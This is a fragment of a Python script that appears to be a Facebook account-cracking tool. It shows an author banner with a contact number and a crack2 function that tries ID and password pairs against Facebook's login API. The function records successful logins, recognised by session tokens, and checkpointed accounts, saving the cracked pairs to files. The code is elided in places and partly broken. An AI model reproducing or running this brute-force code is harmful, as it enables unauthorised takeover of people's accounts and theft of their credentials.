...
\x1b[92;1m===================================>\x1b[92;1m
\x1b[93;1m Author       \x1b[92;1m=>      \x1b[93;1mNayem404cyber
\x1b[93;1m Whatsapp     \x1b[92;1m=>      \x1b[93;1m+8801706167094
\x1b[93;1m YouTube       \x1b[92;1m=>      \x1b[93;1m Music vidio chennel
\x1b[92;1m===================================>\x1b[92;1m
"""%(h))
...
def menu(): #Bilo
	...
	if farhan in ['1','01']:
		...
		os.system("xdg-open https://www.facebook.com/profile.php?id=Nayemvai07")
		exit()
	else:
		os.system("https://www.facebook.com/profile.php?id=Nayemvai07")
		exit()
...
def crack2(idf,pwv):
	...
	fff = '%'
	print('\r%s [Itz ] %s/%s  OK*%s | CP*%s => %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
		...
		try:
			...
			if "www.facebook.com" in resp.json()["error_msg"]:
				if 'ya' in oprek:
					...
					print('\r%s [Itz-CP] %s|%s        '%(b,idf,pw))
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				break
			elif "session_key" in resp.text and "EAAB" in resp.text:
				print('\r%s [Itz-ok] %s|%s        '%(h,idf,pw))
